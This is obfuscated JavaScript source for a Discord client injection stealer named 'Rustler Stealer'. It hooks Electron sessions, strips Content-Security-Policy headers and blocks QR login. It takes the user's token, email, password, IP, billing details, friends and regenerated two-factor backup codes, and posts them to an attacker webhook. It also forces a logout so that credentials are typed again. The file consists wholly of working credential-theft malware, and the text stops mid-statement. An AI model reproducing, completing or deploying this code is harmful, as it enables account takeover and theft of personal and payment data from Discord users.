const B = (function () {
    let n = true
    return function (v, K) {
      const E = n
        ? function () {
            if (K) {
              const d = K.apply(v, arguments)
              return (K = null), d
            }
          }
        : function () {}
      return (n = false), E
    }
  })(),
  a = B(this, function () {
    return a
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(a)
      .search('(((.+)+)+)+$')
  })
a()
const y = (function () {
  let K = true
  return function (A, Q) {
    const t = K
      ? function () {
          if (Q) {
            const P = Q.apply(A, arguments)
            return (Q = null), P
          }
        }
      : function () {}
    return (K = false), t
  }
})()
;(function () {
  y(this, function () {
    const v = new RegExp('function *\\( *\\)'),
      K = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      A = S('init')
    if (!v.test(A + 'chain') || !K.test(A + 'input')) {
      A('0')
    } else {
      S()
    }
  })()
})()
const V = (function () {
    let n = true
    return function (v, K) {
      const E = n
        ? function () {
            if (K) {
              const t = K.apply(v, arguments)
              return (K = null), t
            }
          }
        : function () {}
      return (n = false), E
    }
  })(),
  F = V(this, function () {
    let n
    try {
      const Q = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      n = Q()
    } catch (E) {
      n = window
    }
    const v = (n.console = n.console || {}),
      K = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
    for (let t = 0; t < K.length; t++) {
      const p = V.constructor.prototype.bind(V),
        D = K[t],
        P = v[D] || p
      p['__proto__'] = V.bind(V)
      p.toString = P.toString.bind(P)
      v[D] = p
    }
  })
F()
const fs = require('fs'),
  path = require('path'),
  { BrowserWindow, session } = require('electron'),
  querystring = require('querystring'),
  os = require('os')
var webhook = '%WEBHOOK_LINK%'
var src = 'notdualhook'
const computerName = os.hostname()
const discordInstall = '' + __dirname,
  EvalToken =
    'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;'
String.prototype.insert = function (N, n) {
  if (N > 0) {
    return this.substring(0, N) + n + this.substr(N)
  }
  return n + this
}
const FZ = {}
FZ.logout = 'instant'
FZ['inject-notify'] = 'true'
FZ['logout-notify'] = 'true'
FZ['init-notify'] = 'false'
FZ['embed-color'] = 3553599
FZ['disable-qr-code'] = 'true'
const config = FZ
;(function () {
  const n = function () {
    let Q
    try {
      Q = Function('return (function() {}.constructor("return this")( ));')()
    } catch (z) {
      Q = window
    }
    return Q
  }
  const v = n()
  v.setInterval(S, 4000)
})()
session.defaultSession.webRequest.onHeadersReceived((K, A) => {
  if (K.url.startsWith(webhook)) {
    if (K.url.includes('discord.com')) {
      const z = {}
      z['Access-Control-Allow-Headers'] = '*'
      A({ responseHeaders: Object.assign(z, K.responseHeaders) })
    } else {
      A({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': [
              "default-src '*'",
              "Access-Control-Allow-Headers '*'",
              "Access-Control-Allow-Origin '*'",
            ],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          K.responseHeaders
        ),
      })
    }
  } else {
    delete K.responseHeaders['content-security-policy']
    delete K.responseHeaders['content-security-policy-report-only']
    const p = { ...K.responseHeaders }
    p['Access-Control-Allow-Headers'] = '*'
    const D = { responseHeaders: p }
    A(D)
  }
})
function FirstTime(N) {
  const v = BrowserWindow.getAllWindows()[0]
  v.webContents.executeJavaScript('' + EvalToken, true).then((K) => {
    if (config['init-notify'] == 'true') {
      if (fs.existsSync(path.join(__dirname, 'init'))) {
        fs.rmdirSync(path.join(__dirname, 'init'))
        if (K == null || K == undefined || K == '') {
          const t = {
            username: 'Rustler Stealer',
            content: '',
            embeds: [
              {
                title: 'Discord Started',
                color: config['embed-color'],
                fields: [
                  {
                    name: 'Info',
                    value:
                      '```Hostname: \n' +
                      computerName +
                      '\nInjection Info: \n' +
                      __dirname +
                      '\n```',
                    inline: false,
                  },
                ],
                author: { name: 'Rustler Stealer' },
                footer: { text: 'Rustler Stealer' },
              },
            ],
          }
          var Q = t
          SendToWebhook(JSON.stringify(Q))
        } else {
          const p = BrowserWindow.getAllWindows()[0]
          p.webContents
            .executeJavaScript(
              '\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","' +
                K +
                '"),xmlHttp.send(null),xmlHttp.responseText;\n                    ',
              true
            )
            .then((D) => {
              const m = JSON.parse(D)
              var g = {
                username: 'Rustler Stealer',
                content: '',
                embeds: [
                  {
                    title: 'Discord Initalized',
                    description:
                      '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://rustlercoppy.com/copy/' +
                      K +
                      ')',
                    color: config['embed-color'],
                    fields: [
                      {
                        name: 'Info',
                        value:
                          '```Hostname: \n' +
                          computerName +
                          '\nInjection Info: \n' +
                          __dirname +
                          '\n```',
                        inline: false,
                      },
                      {
                        name: 'Username',
                        value: '`' + m.username + '#' + m.discriminator + '`',
                        inline: true,
                      },
                      {
                        name: 'Email:',
                        value: '`' + N + '`',
                        inline: true,
                      },
                      {
                        name: 'Badges',
                        value: '' + GetBadges(m.flags),
                        inline: false,
                      },
                      {
                        name: 'Token',
                        value: '```' + K + '```',
                        inline: false,
                      },
                    ],
                    author: { name: 'Rustler Stealer' },
                    footer: { text: 'Rustler Stealer' },
                    thumbnail: {
                      url:
                        'https://cdn.discordapp.com/avatars/' +
                        m.id +
                        '/' +
                        m.avatar,
                    },
                  },
                ],
              }
              SendToWebhook(JSON.stringify(g))
            })
        }
      }
    }
    if (!fs.existsSync(path.join(__dirname, 'Rustler'))) {
      return true
    }
    fs.rmdirSync(path.join(__dirname, 'Rustler'))
    if (config.logout != 'false' || config.logout == '%LOGOUT%') {
      if (config['logout-notify'] == 'true') {
        if (K == null || K == undefined || K == '') {
          const o = {
            username: 'Rustler Stealer',
            content: '',
            embeds: [
              {
                title: 'User log out (User not Logged in before)',
                color: config['embed-color'],
                fields: [
                  {
                    name: 'Info',
                    value:
                      '```Hostname: \n' +
                      computerName +
                      '\nInjection Info: \n' +
                      __dirname +
                      '\n```',
                    inline: false,
                  },
                ],
                author: { name: 'Rustler Stealer' },
                footer: { text: 'Rustler Stealer' },
              },
            ],
          }
          var Q = o
          SendToWebhook(JSON.stringify(Q))
        } else {
          const w = BrowserWindow.getAllWindows()[0]
          w.webContents
            .executeJavaScript(
              '\n                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","' +
                K +
                '"),xmlHttp.send(null),xmlHttp.responseText;\n                    ',
              true
            )
            .then((f) => {
              const W = JSON.parse(f)
              var r = {
                username: 'Rustler Stealer',
                content: '',
                embeds: [
                  {
                    color: config['embed-color'],
                    fields: [
                      {
                        name: '<:token:949679866188529714> Token:',
                        value:
                          '`' +
                          K +
                          '`' +
                          '\n[CopyToken](https://rustlercoppy.com/copy/' +
                          K +
                          ')',
                        inline: false,
                      },
                      {
                        name: '<:password:949679865580384266> Username:',
                        value: '`' + W.username + '#' + W.discriminator + '`',
                        inline: true,
                      },
                      {
                        name: '<:ip:949680203859369994> ID:',
                        value: '`' + W.id + '`',
                        inline: true,
                      },
                      {
                        name: '<:mail:949679866113032253> Email:',
                        value: '`' + W.email + '`',
                        inline: true,
                      },
                      {
                        name: '<:badge:949679865710403584> Badges:',
                        value: '' + GetBadges(W.flags),
                        inline: true,
                      },
                      {
                        name: '<:nitro:949679866033352784> Nitro Type:',
                        value:
                          '' +
                          GetNitro(json.premium_type) +
                          BoostBadge(json.flags),
                        inline: true,
                      },
                    ],
                    author: {
                      name:
                        W.username + '#' + W.discriminator + ' (' + W.id + ')',
                      icon_url:
                        'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
                    },
                    footer: { text: 'Rustler Stealer' },
                    thumbnail: {
                      url:
                        'https://cdn.discordapp.com/avatars/' +
                        W.id +
                        '/' +
                        W.avatar,
                    },
                  },
                ],
              }
              SendToWebhook(JSON.stringify(r))
            })
        }
      }
      const m = BrowserWindow.getAllWindows()[0]
      m.webContents
        .executeJavaScript(
          'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
          true
        )
        .then((r) => {})
    }
    return false
  })
}
const Fo = {}
Fo.urls = [
  'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
  'https://*.discord.com/api/v*/applications/detectable',
  'https://discord.com/api/v*/applications/detectable',
  'https://*.discord.com/api/v*/users/@me/library',
  'https://discord.com/api/v*/users/@me/library',
  'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
  'https://discord.com/api/v*/users/@me/billing/subscriptions',
  'wss://remote-auth-gateway.discord.gg/*',
]
const Filter = Fo
session.defaultSession.webRequest.onBeforeRequest(Filter, (n, v) => {
  if (n.url.startsWith('wss://')) {
    const Q = { cancel: true }
    v(Q)
    return
  }
  if (FirstTime()) {
  }
  v({})
  return
})
function SendToWebhook(N) {
  const n = BrowserWindow.getAllWindows()[0]
  n.webContents
    .executeJavaScript(
      '\n\tvar xhr = new XMLHttpRequest();\n    xhr.open("POST", "' +
        webhook +
        "\", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(" +
        N +
        '));\n    ',
      true
    )
    .then((v) => {})
  n.webContents
    .executeJavaScript(
      '    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "' +
        src +
        "\", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(" +
        N +
        '));\n    ',
      true
    )
    .then((v) => {})
}
function GetNitro(N) {
  if (N == 0) {
    return ''
  }
  if (N == 1) {
    return '<:classic:896119171019067423>'
  }
  if (N == 2) {
    return '<:nitro:959154541025173514> '
  } else {
    return ''
  }
}
function GetRBadges(N) {
  var d = ''
  if ((N & 1) == 1) {
    d += '<:staff:874750808728666152> '
  }
  if ((N & 2) == 2) {
    d += '<:partner:874750808678354964> '
  }
  if ((N & 4) == 4) {
    d += '<:hypesquad_events:874750808594477056> '
  }
  if ((N & 8) == 8) {
    d += '<:bughunter_1:874750808426692658> '
  }
  if ((N & 512) == 512) {
    d += '<:early_supporter:874750808414113823> '
  }
  ;(N & 16384) == 16384 && (d += '<:bughunter_2:874750808430874664> ')
  ;(N & 131072) == 131072 && (d += '<:developer:874750808472825986> ')
  if (d == '') {
    d = ''
  }
  return d
}
function GetBadges(N) {
  const K = 2,
    d = 512,
    p = 16384
  var P = ''
  ;(N & 1) == 1 && (P += '<:staff:874750808728666152> ')
  if ((N & K) == K) {
    P += '<:partner:874750808678354964> '
  }
  ;(N & 4) == 4 && (P += '<:hypesquad_events:874750808594477056> ')
  if ((N & 8) == 8) {
    P += '<:bughunter_1:874750808426692658> '
  }
  ;(N & 64) == 64 && (P += '<:bravery:874750808388952075> ')
  if ((N & 128) == 128) {
    P += '<:brilliance:874750808338608199> '
  }
  if ((N & 256) == 256) {
    P += '<:balance:874750808267292683> '
  }
  if ((N & d) == d) {
    P += '<:early_supporter:874750808414113823> '
  }
  if ((N & p) == p) {
    P += '<:bughunter_2:874750808430874664> '
  }
  if ((N & 131072) == 131072) {
    P += '<:developer:874750808472825986> '
  }
  if (P == '') {
    P = '`No Badges`'
  }
  return P
}
function BoostBadge(n) {
  if (n >= 720) {
    return '<:boost24month:962837777525915648> '
  }
  if (n >= 540) {
    return '<:boost18month:962837731514388480> '
  }
  if (n >= 450) {
    return '<:boost15month:962837690951295037> '
  }
  if (n >= 360) {
    return '<:boost12month:962837635670347816> '
  }
  if (n >= 270) {
    return '<:boost9month:962837558864281610> '
  }
  if (n >= 180) {
    return '<:boost6month:962837507349827596> '
  }
  if (n >= 90) {
    return '<:boost3month:962837461128581250> '
  }
  if (n >= 60) {
    return '<:boost2month:962837424998875186> '
  }
  if (n >= 1) {
    return '<:boost1month:962837361048293398> '
  }
  if (n <= 0) {
    return ''
  }
}
function Login(N, n, v) {
  const A = BrowserWindow.getAllWindows()[0]
  A.webContents
    .executeJavaScript(
      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
        v +
        '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
      true
    )
    .then((Q) => {
      A.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          true
        )
        .then((t) => {
          A.webContents
            .executeJavaScript(
              '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                v +
                '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
              true
            )
            .then((p) => {
              A.webContents
                .executeJavaScript(
                  '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                    v +
                    '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                  true
                )
                .then((G) => {
                  if (v.startsWith('mfa')) {
                    A.webContents
                      .executeJavaScript(
                        '\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v8/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\n              xmlHttp.setRequestHeader("authorization", "' +
                          v +
                          '")\n              xmlHttp.send(JSON.stringify({"password":"' +
                          n +
                          '","regenerate":true}));\n              xmlHttp.responseText',
                        true
                      )
                      .then((o) => {
                        var w = [],
                          f = '',
                          W = 'https://rustlercoppy.com/copy/',
                          i = JSON.parse(o)
                        let R = i.backup_codes
                        const l = R.filter((c) => {
                          return c.consumed == false
                        })
                        for (let c in l) {
                          if (c == 0) {
                            f +=
                              '<:Rustler:936417408363679824> `' +
                              l[c].code.insert(4, '') +
                              '` '
                          } else {
                            if (c % 2 === 1) {
                              f +=
                                '<:Rustler:936417408363679824> `' +
                                l[c].code.insert(4, '') +
                                '` \n'
                            } else {
                              f +=
                                '<:Rustler:936417408363679824> `' +
                                l[c].code.insert(4, '') +
                                '` '
                            }
                          }
                        }
                        function J() {
                          var x = JSON.parse(G)
                          const X = x.filter((u) => {
                            return u.type == 1
                          })
                          return X.length
                        }
                        function I() {
                          var x = JSON.parse(G)
                          const F1 = x.filter((F2) => {
                            return F2.type == 1
                          })
                          var X = ''
                          for (z of F1) {
                            var u = GetRBadges(z.user.public_flags)
                            u != '' &&
                              (X +=
                                u +
                                (' | `' +
                                  z.user.username +
                                  '#' +
                                  z.user.discriminator +
                                  '`\n'))
                          }
                          return X == '' && (X = '*Nothing to see here*'), X
                        }
                        function C() {
                          const X = JSON.parse(p)
                          var x = ''
                          return (
                            X.forEach((u) => {
                              if (u.type == '') {
                                return '`No`'
                              } else {
                                if (u.type == 2 && u.invalid != true) {
                                  x += ' <:paypal:896441236062347374>'
                                } else {
                                  if (u.type == 1 && u.invalid != true) {
                                    x += ' :credit_card:'
                                  } else {
                                    return '`No`'
                                  }
                                }
                              }
                            }),
                            x == '' && (x = '`No`'),
                            x
                          )
                        }
                        const L = JSON.parse(Q)
                        var k = {
                          username: 'Rustler Stealer',
                          content: '',
                          embeds: [
                            {
                              color: config['embed-color'],
                              fields: [
                                {
                                  name: '<:token:949679866188529714> Token:',
                                  value:
                                    '`' +
                                    v +
                                    '`' +
                                    '\n[CopyToken](https://rustlercoppy.com/copy/' +
                                    v +
                                    '<br>' +
                                    N +
                                    ':' +
                                    n +
                                    ')',
                                  inline: false,
                                },
                                {
                                  name: '<:badge:949679865710403584> Badges:',
                                  value: '' + GetBadges(L.flags),
                                  inline: true,
                                },
                                {
                                  name: '<:nitro:949679866033352784> Nitro Type:',
                                  value: '' + GetNitro(L.premium_type),
                                  inline: true,
                                },
                                {
                                  name: '<:card:949679865798475827>Billing',
                                  value: '' + C(),
                                  inline: true,
                                },
                                {
                                  name: '<:ip:949680203859369994> IP:',
                                  value: '`' + t + '`',
                                  inline: true,
                                },
                                {
                                  name: '<:mail:949679866113032253> Email:',
                                  value: '`' + N + '`',
                                  inline: true,
                                },
                                {
                                  name: '<:password:949679865580384266> Password:',
                                  value: '`' + n + '`',
                                  inline: true,
                                },
                              ],
                              author: {
                                name:
                                  L.username +
                                  '#' +
                                  L.discriminator +
                                  ' (' +
                                  L.id +
                                  ')',
                                icon_url:
                                  'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',                              },
                              footer: { text: 'Rustler Stealer' },
                              thumbnail: {
                                url:
                                  'https://cdn.discordapp.com/avatars/' +
                                  L.id +
                                  '/' +
                                  L.avatar,
                              },
                            },
                          ],
                        }
                        const H = {
                          color: config['embed-color'],
                          description: '' + f,
                          author: {},
                          footer: {},
                        }
                        H.author.icon_url =
                          'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif'
                        H.author.name = '2FA Codes'
                        H.footer.text = 'Rustler Stealer'
                        var j = H,
                          M = {
                            color: config['embed-color'],
                            description: I(),
                            author: {
                              icon_url:
                                'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',
                              name: 'HQ Friends',
                            },
                            footer: { text: 'Rustler Stealer' },
                          }
                        if (v.startsWith('mfa')) {
                          k.embeds.push(j)
                        }
                        k.embeds.push(M)
                        SendToWebhook(JSON.stringify(k))
                      })
                  } else {
                    const O = BrowserWindow.getAllWindows()[0]
                    O.webContents
                      .executeJavaScript(
                        '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
                          v +
                          '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
                        true
                      )
                      .then((w) => {
                        O.webContents
                          .executeJavaScript(
                            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
                            true
                          )
                          .then((r) => {
                            O.webContents
                              .executeJavaScript(
                                '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                                  v +
                                  '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
                                true
                              )
                              .then((k) => {
                                O.webContents
                                  .executeJavaScript(
                                    '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                                      v +
                                      '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                                    true
                                  )
                                  .then((R) => {
                                    function C() {
                                      var h = JSON.parse(R)
                                      const Y = h.filter((q) => {
                                        return q.type == 1
                                      })
                                      return Y.length
                                    }
                                    function L() {
                                      var s = JSON.parse(R)
                                      const q = s.filter((e) => {
                                        return e.type == 1
                                      })
                                      var h = ''
                                      for (z of q) {
                                        var Y = GetRBadges(z.user.public_flags)
                                        Y != '' &&
                                          (h +=
                                            Y +
                                            (' | `' +
                                              z.user.username +
                                              '#' +
                                              z.user.discriminator +
                                              '`\n'))
                                      }
                                      return (
                                        h == '' &&
                                          (h = '*Nothing to see here*'),
                                        h
                                      )
                                    }
                                    function H() {
                                      const q = JSON.parse(k)
                                      var h = ''
                                      q.forEach((e) => {
                                        if (e.type == '') {
                                          return '`No`'
                                        } else {
                                          if (
                                            e.type == 2 &&
                                            e.invalid != true
                                          ) {
                                            h += ' <:paypal:896441236062347374>'
                                          } else {
                                            if (
                                              e.type == 1 &&
                                              e.invalid != true
                                            ) {
                                              h += ' :credit_card:'
                                            } else {
                                              return '`No`'
                                            }
                                          }
                                        }
                                      })
                                      if (h == '') {
                                        h = '`No`'
                                      }
                                      return h
                                    }
                                    const c = JSON.parse(w)
                                    var J = {
                                      username: 'Rustler Stealer',
                                      content: '',
                                      embeds: [
                                        {
                                          color: config['embed-color'],
                                          fields: [
                                            {
                                              name: '<:token:949679866188529714> Token:',
                                              value:
                                                '`' +
                                                v +
                                                '`' +
                                                '\n[CopyToken](https://rustlercoppy.com/copy/' +
                                                v +
                                                '<br>' +
                                                N +
                                                ':' +
                                                n +
                                                ')',
                                              inline: false,
                                            },
                                            {
                                              name: '<:badge:949679865710403584> Badges:',
                                              value: '' + GetBadges(c.flags),
                                              inline: true,
                                            },
                                            {
                                              name: '<:nitro:949679866033352784> Nitro Type:',
                                              value:
                                                '' + GetNitro(c.premium_type),
                                              inline: true,
                                            },
                                            {
                                              name: '<:card:949679865798475827>Billing',
                                              value: '' + H(),
                                              inline: true,
                                            },
                                            {
                                              name: '<:ip:949680203859369994> IP:',
                                              value: '`' + r + '`',
                                              inline: true,
                                            },
                                            {
                                              name: '<:mail:949679866113032253> Email:',
                                              value: '`' + N + '`',
                                              inline: true,
                                            },
                                            {
                                              name: '<:password:949679865580384266> Password:',
                                              value: '`' + n + '`',
                                              inline: true,
                                            },
                                          ],
                                          author: {
                                            name:
                                              c.username +
                                              '#' +
                                              c.discriminator +
                                              ' (' +
                                              c.id +
                                              ')',
                                            icon_url:
                                              'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',
                                          },
                                          footer: { text: 'Rustler Stealer' },
                                          thumbnail: {
                                            url:
                                              'https://cdn.discordapp.com/avatars/' +
                                              c.id +
                                              '/' +
                                              c.avatar,
                                          },
                                        },
                                        {
                                          color: config['embed-color'],
                                          description: L(),
                                          author: {
                                            icon_url:
                                              'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',
                                            name: 'HQ Friends',
                                          },
                                          footer: { text: 'Rustler Stealer' },
                                        },
                                      ],
                                    }
                                    SendToWebhook(JSON.stringify(J))
                                  })
                              })
                          })
                      })
                  }
                })
            })
        })
    })
}
function ChangePassword(N, n, v) {
  const A = BrowserWindow.getAllWindows()[0]
  A.webContents
    .executeJavaScript(
      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
        v +
        '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
      true
    )
    .then((Q) => {
      A.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          true
        )
        .then((t) => {
          A.webContents
            .executeJavaScript(
              '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                v +
                '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
              true
            )
            .then((D) => {
              A.webContents
                .executeJavaScript(
                  '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                    v +
                    '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                  true
                )
                .then((G) => {
                  if (v.startsWith('mfa')) {
                    A.webContents
                      .executeJavaScript(
                        '\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v8/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\n              xmlHttp.setRequestHeader("authorization", "' +
                          v +
                          '")\n\t      xmlHttp.send(JSON.stringify({"password":"' +
                          n +
                          '","regenerate":true}));\n              xmlHttp.responseText',
                        true
                      )
                      .then((Z) => {
                        var O = [],
                          w = '',
                          f = 'https://rustlercoppy.com/copy/',
                          W = JSON.parse(Z)
                        let R = W.backup_codes
                        const l = R.filter((c) => {
                          return c.consumed == false
                        })
                        for (let c in l) {
                          if (c == 0) {
                            w +=
                              '<:Rustler:936417408363679824> `' +
                              l[c].code.insert(4, '') +
                              '` '
                          } else {
                            if (c % 2 === 1) {
                              w +=
                                '<:Rustler:936417408363679824> `' +
                                l[c].code.insert(4, '') +
                                '` \n'
                            } else {
                              w +=
                                '<:Rustler:936417408363679824> `' +
                                l[c].code.insert(4, '') +
                                '` '
                            }
                          }
                        }
                        function J() {
                          var x = JSON.parse(G)
                          const u = x.filter((F0) => {
                            return F0.type == 1
                          })
                          return u.length
                        }
                        function I() {
                          var x = JSON.parse(G)
                          const F0 = x.filter((F1) => {
                            return F1.type == 1
                          })
                          var X = ''
                          for (z of F0) {
                            var u = GetRBadges(z.user.public_flags)
                            if (u != '') {
                              X +=
                                u +
                                (' | `' +
                                  z.user.username +
                                  '#' +
                                  z.user.discriminator +
                                  '`\n')
                            }
                          }
                          if (X == '') {
                            X = '*Nothing to see here*'
                          }
                          return X
                        }
                        function C() {
                          const X = JSON.parse(D)
                          var x = ''
                          X.forEach((u) => {
                            if (u.type == '') {
                              return '`No`'
                            } else {
                              if (u.type == 2 && u.invalid != true) {
                                x += ' <:paypal:896441236062347374>'
                              } else {
                                if (u.type == 1 && u.invalid != true) {
                                  x += ' :credit_card:'
                                } else {
                                  return '`No`'
                                }
                              }
                            }
                          })
                          if (x == '') {
                            x = '`No`'
                          }
                          return x
                        }
                        const L = JSON.parse(Q)
                        var i = {
                          username: 'Rustler Stealer',
                          content: '',
                          embeds: [
                            {
                              color: config['embed-color'],
                              fields: [
                                {
                                  name: '<:token:949679866188529714> Token:',
                                  value:
                                    '`' +
                                    v +
                                    '`' +
                                    '\n[CopyToken](https://rustlercoppy.com/copy/' +
                                    v +
                                    '<br>' +
                                    L.email +
                                    ':' +
                                    n +
                                    ')',
                                  inline: false,
                                },
                                {
                                  name: '<:badge:949679865710403584> Badges:',
                                  value: '' + GetBadges(L.flags),
                                  inline: true,
                                },
                                {
                                  name: '<:nitro:949679866033352784> Nitro Type:',
                                  value: '' + GetNitro(L.premium_type),
                                  inline: true,
                                },
                                {
                                  name: '<:card:949679865798475827>Billing',
                                  value: '' + C(),
                                  inline: true,
                                },
                                {
                                  name: '<:ip:949680203859369994> IP:',
                                  value: '`' + t + '`',
                                  inline: true,
                                },
                                {
                                  name: '<:mail:949679866113032253> Email:',
                                  value: '`' + L.email + '`',
                                  inline: true,
                                },
                                {
                                  name: '<:password:949679865580384266> Old Password:',
                                  value: '`' + N + '`',
                                  inline: true,
                                },
                                {
                                  name: '<:password:949679865580384266> New Password:',
                                  value: '`' + n + '`',
                                  inline: true,
                                },
                              ],
                              author: {
                                name:
                                  L.username +
                                  '#' +
                                  L.discriminator +
                                  ' (' +
                                  L.id +
                                  ')',
                                icon_url:
                                  'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',                              },
                              footer: { text: 'Rustler Stealer' },
                              thumbnail: {
                                url:
                                  'https://cdn.discordapp.com/avatars/' +
                                  L.id +
                                  '/' +
                                  L.avatar,
                              },
                            },
                          ],
                        }
                        const H = {
                          color: config['embed-color'],
                          description: '' + w,
                          author: {},
                          footer: {},
                        }
                        H.author.icon_url =
                          'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif'
                        H.author.name = '2FA Codes'
                        H.footer.text = 'Rustler Stealer'
                        var k = H,
                          j = {
                            color: config['embed-color'],
                            description: I(),
                            author: {
                              icon_url:
                                'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',
                              name: 'HQ Friends',
                            },
                            footer: { text: 'Rustler Stealer' },
                          }
                        if (v.startsWith('mfa')) {
                          i.embeds.push(k)
                        }
                        i.embeds.push(j)
                        SendToWebhook(JSON.stringify(i))
                      })
                  } else {
                    const o = BrowserWindow.getAllWindows()[0]
                    o.webContents
                      .executeJavaScript(
                        '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
                          v +
                          '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
                        true
                      )
                      .then((O) => {
                        o.webContents
                          .executeJavaScript(
                            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
                            true
                          )
                          .then((f) => {
                            o.webContents
                              .executeJavaScript(
